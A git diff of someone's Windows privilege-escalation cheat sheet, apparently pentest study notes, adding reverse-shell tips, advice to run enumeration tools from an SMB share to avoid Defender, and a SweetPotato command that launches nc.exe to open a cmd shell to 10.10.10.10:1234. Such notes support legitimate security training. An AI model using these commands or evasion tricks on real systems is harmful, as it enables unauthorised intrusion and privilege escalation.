@@ -44,6 +44,13 @@ dir /A:H (ls -la of cmd.exe)
 ls -force (ls -la of powershell)
 ```
 
+### Reverse Shells
+
+```
+Powershell base64 encode reverse shell works most of the time
+nc64.exe best run via cmd or powershell first (eg. cmd.exe /c nc64.exe ...)
+```
+
 ### User Enumeration
 
 ```
@@ -58,7 +65,7 @@ net localgroup $groupname
 ```
 ipconfig
 arp -a
-netstat -ano 
+netstat -ano | findstr LISTENING
 ```
 
 ### Password Hunting (Can automate)
@@ -78,6 +85,10 @@ netsh firewall show state/config
 
 ## Automated Enumeration
 
+{% hint style="info" %}
+Run these from a SMB network share and not transfer to disk so Defender is not triggered
+{% endhint %}
+
 #### GO TO
 
 * winPEAS.exe
@@ -90,11 +101,9 @@ netsh firewall show state/config
 
 * Seatbelt.exe
 * Watson.exe
-* Sherlock.ps1
+* Sherlock.ps1 \[Deprecated]
 * jaws-enum.ps1
 * windows-exploit-suggester.py
-
-Sherlock looks for a set of CVEs most famous
 
 ## Passwords and Port Forwarding
 
@@ -131,13 +140,9 @@ C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc #check perms
 sc qc daclsvc
 ```
 
-## WSL
-
-not sure if i need it at this point in time so do come back and check up
-
 ## Token Impersonation
 
-like cookies for your computer
+Like cookies for your computer
 
 * Delegate - created for logging into machine or RDP
 * Impersonate - "non-interactive" such as attaching network drive or domain login script&#x20;
@@ -156,6 +161,35 @@ msfvenom to generate powershell payload, check how to do it wo meterpreter tho
 * Named Pipe impersonation (Dropper/admin) - most risky, will be flagged by AV cus inserting dll into disk
 * Token Impersonation (In memory/admin) - Needs SeDebugPriveleges
 
+#### Potatoes
+
+* SweetPotato - `.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"`
+
+## Recycle Bin
+
+```
+View items in the bin
+
+$shell = New-Object -ComObject Shell.Application
+$recycleBin = $shell.Namespace(0xA)
+$recycleBin.items() | Select-Object Name, Path
+
+Restore deleted file
+
+$recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)
+$items = $recycleBin.Items()
+$item = $items | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}
+$documentsPath = [Environment]::GetFolderPath("Desktop")
+$documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)
+$documents.MoveHere($item)
+```
+
+## Exe Analysis
+
+dnSpy the GOAT
+
+<div align="left"><figure><img src="../.gitbook/assets/image (1).png" alt="" width="563"><figcaption></figcaption></figure></div>
+
 ## Kernel Exploits
 
 Most basic zero skill vector - this why make sure your systems are always updated
@@ -172,3 +206,6 @@ MS10-059 and others very popular: focus on privelege escalation vulns mentioned&
 * Startup Applications - \[Ben `Autorun`]
 * DLL Hijacking - \[Ben DLL]
 
+## WSL
+
+not sure if i need it at this point in time so do come back and check up
